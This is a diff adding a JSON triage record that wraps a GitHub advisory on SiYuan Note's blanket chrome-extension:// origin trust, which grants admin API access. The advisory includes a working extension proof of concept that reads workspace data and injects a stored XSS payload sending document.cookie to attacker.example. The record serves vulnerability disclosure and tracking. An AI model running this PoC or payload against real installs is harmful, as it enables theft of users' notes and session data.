@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/102439013?v=4\", \"events_url\": \"https://api.github.com/users/oduoke567/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/oduoke567/followers\", \"following_url\": \"https://api.github.com/users/oduoke567/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/oduoke567/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/oduoke567\", \"id\": 102439013, \"login\": \"oduoke567\", \"node_id\": \"U_kgDOBhsYZQ\", \"organizations_url\": \"https://api.github.com/users/oduoke567/orgs\", \"received_events_url\": \"https://api.github.com/users/oduoke567/received_events\", \"repos_url\": \"https://api.github.com/users/oduoke567/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/oduoke567/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/oduoke567/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/oduoke567\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-54069\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 9.2, \"vector_string\": \"CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-346\", \"name\": \"Origin Validation Error\"}], \"description\": \"## Summary\\n\\nSiYuan Note's kernel HTTP server unconditionally trusts all `chrome-extension://` origins, granting `RoleAdministrator` access to every installed browser extension without any authentication. Combined with the default empty `AccessAuthCode` on desktop installs, any Chrome/Chromium extension -- including a compromised legitimate extension via supply chain attack -- can make fully authenticated admin API calls to the SiYuan kernel at `127.0.0.1:6806`, enabling data exfiltration, stored XSS injection, and configuration tampering.\\n\\n## Affected Versions\\n\\nSiYuan <= v3.6.5 (commit `96dfe0bea474`). The chrome-extension allowlist remains unfixed as of the latest commit on the fix branch (`d7b77d945e0d`).\\n\\n## Vulnerability Details\\n\\n### Blanket chrome-extension:// Origin Trust (CWE-346)\\n\\nIn `kernel/model/session.go:277`, the `CheckAuth` middleware exempts all `chrome-extension://` origins from authentication:\\n\\n```go\\nif strings.HasPrefix(origin, \\\"chrome-extension://\\\") {\\n    // skip auth\\n}\\n```\\n\\nAt `session.go:284`, the request is assigned `RoleAdministrator`:\\n\\n```go\\nc.Set(\\\"role\\\", model.RoleAdministrator)\\n```\\n\\nThe `AccessAuthCode` field defaults to an empty string for desktop installs (`ContainerStd`). When empty, no token validation occurs. This means **any** Chrome/Chromium extension can make fully authenticated admin API calls to the SiYuan kernel.\\n\\nThe origin check trusts the entire `chrome-extension://` scheme rather than validating a specific extension ID, so every installed extension (including those with no explicit `host_permissions`) can access all admin endpoints.\\n\\n## Proof of Concept\\n\\n**Unauthenticated admin API access via browser extension:**\\n\\nA minimal Chrome extension with only default permissions:\\n\\n```json\\n{\\n  \\\"manifest_version\\\": 3,\\n  \\\"name\\\": \\\"SiYuan PoC\\\",\\n  \\\"version\\\": \\\"1.0\\\",\\n  \\\"background\\\": {\\n    \\\"service_worker\\\": \\\"bg.js\\\"\\n  }\\n}\\n```\\n\\n```javascript\\n// bg.js -- runs as chrome-extension://<id>\\n// No special host_permissions needed; localhost is accessible by default\\n\\n// 1. Verify admin access\\nfetch('http://127.0.0.1:6806/api/system/getConf', {\\n  method: 'POST',\\n  headers: { 'Content-Type': 'application/json' },\\n  body: '{}'\\n}).then(r => r.json()).then(data => {\\n  console.log('[PoC] Admin API access confirmed:', data.code === 0);\\n});\\n\\n// 2. Exfiltrate workspace data\\nfetch('http://127.0.0.1:6806/api/query/sql', {\\n  method: 'POST',\\n  headers: { 'Content-Type': 'application/json' },\\n  body: JSON.stringify({ stmt: 'SELECT * FROM blocks LIMIT 100' })\\n}).then(r => r.json()).then(data => {\\n  console.log('[PoC] Exfiltrated blocks:', data.data?.length);\\n});\\n\\n// 3. Inject stored XSS payload into a note\\nfetch('http://127.0.0.1:6806/api/filetree/listDocsByPath', {\\n  method: 'POST',\\n  headers: { 'Content-Type': 'application/json' },\\n  body: JSON.stringify({ notebook: '', path: '/' })\\n}).then(r => r.json()).then(tree => {\\n  const firstDoc = tree.data?.files?.[0];\\n  if (!firstDoc) return;\\n\\n  fetch('http://127.0.0.1:6806/api/block/insertBlock', {\\n    method: 'POST',\\n    headers: { 'Content-Type': 'application/json' },\\n    body: JSON.stringify({\\n      dataType: 'markdown',\\n      data: '<img src=x onerror=\\\"fetch(\\\\'https://attacker.example/steal?data=\\\\'+document.cookie)\\\">',\\n      parentID: firstDoc.id\\n    })\\n  });\\n});\\n```\\n\\nThe extension requires zero special permissions. The `chrome-extension://` origin header is automatically sent by the browser, and `session.go:277` grants it `RoleAdministrator` without any token check.\\n\\n## Impact\\n\\n- **Unauthenticated admin API access** for any installed browser extension, enabling full control of the SiYuan kernel\\n- **Data exfiltration** of the entire workspace via `/api/query/sql`, `/api/filetree/`, `/api/export/`\\n- **Stored XSS injection** via admin API endpoints (`/api/block/insertBlock`, `/api/attr/setBlockAttrs`), persisted in the user's notes\\n- **Configuration tampering** via `/api/system/setConf`, enabling persistence and further attack surface expansion\\n- **Supply chain amplification**: a single compromised popular Chrome extension update can silently exploit every SiYuan desktop user\\n\\n## Suggested Remediation\\n\\n**Remove blanket chrome-extension:// allowlist:**\\n\\n```diff\\n--- a/kernel/model/session.go\\n+++ b/kernel/model/session.go\\n@@ -274,9 +274,6 @@\\n func CheckAuth(c *gin.Context) {\\n     origin := c.GetHeader(\\\"Origin\\\")\\n-    if strings.HasPrefix(origin, \\\"chrome-extension://\\\") {\\n-        // Allow chrome extension requests\\n-    } else\\n     if !isValidOrigin(origin) {\\n         c.AbortWithStatusJSON(401, gin.H{\\\"code\\\": -1, \\\"msg\\\": \\\"invalid origin\\\"})\\n         return\\n```\\n\\nIf extension access is required, implement a per-session token exchange: the SiYuan UI generates a random token on startup, and the extension must present it via a dedicated pairing endpoint. This ensures only explicitly authorized extensions can access the API.\", \"epss\": {\"percentage\": 0.00607, \"percentile\": 0.44538}, \"ghsa_id\": \"GHSA-hvr9-72v2-fff3\", \"github_reviewed_at\": \"2026-07-10T19:26:06Z\", \"html_url\": \"https://github.com/advisories/GHSA-hvr9-72v2-fff3\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-hvr9-72v2-fff3\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-54069\"}], \"nvd_published_at\": \"2026-06-24T22:16:48Z\", \"published_at\": \"2026-07-10T19:26:06Z\", \"references\": [\"https://github.com/siyuan-note/siyuan/security/advisories/GHSA-hvr9-72v2-fff3\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-54069\", \"https://github.com/advisories/GHSA-hvr9-72v2-fff3\"], \"repository_advisory_url\": \"https://api.github.com/repos/siyuan-note/siyuan/security-advisories/GHSA-hvr9-72v2-fff3\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/siyuan-note/siyuan\", \"summary\": \"SiYuan: Unauthenticated Admin API Access via Blanket chrome-extension:// Origin Allowlist\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-10T19:27:59Z\", \"url\": \"https://api.github.com/advisories/GHSA-hvr9-72v2-fff3\", \"vulnerabilities\": [{\"first_patched_version\": \"0.0.0-20260628153353-2d5d72223df4\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/siyuan-note/siyuan/kernel\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.0.0-20260628153353-2d5d72223df4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-hvr9-72v2-fff3",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/siyuan-note/siyuan/kernel: < 0.0.0-20260628153353-2d5d72223df4"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-54069"
+    ],
+    "cvss_score": 9.2,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/siyuan-note/siyuan/kernel"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:51:55.244975Z",
+  "provenance": {
+    "content_sha256": "ad5ffa7a91a9ec827ad7d87ec59efefc30bb630816010ee2190345e5ef90e126",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-10T19:26:06Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-hvr9-72v2-fff3",
+  "status": "active",
+  "title": "SiYuan: Unauthenticated Admin API Access via Blanket chrome-extension:// Origin Allowlist",
+  "updated_at": "2026-07-10T19:27:59Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-hvr9-72v2-fff3"
+}
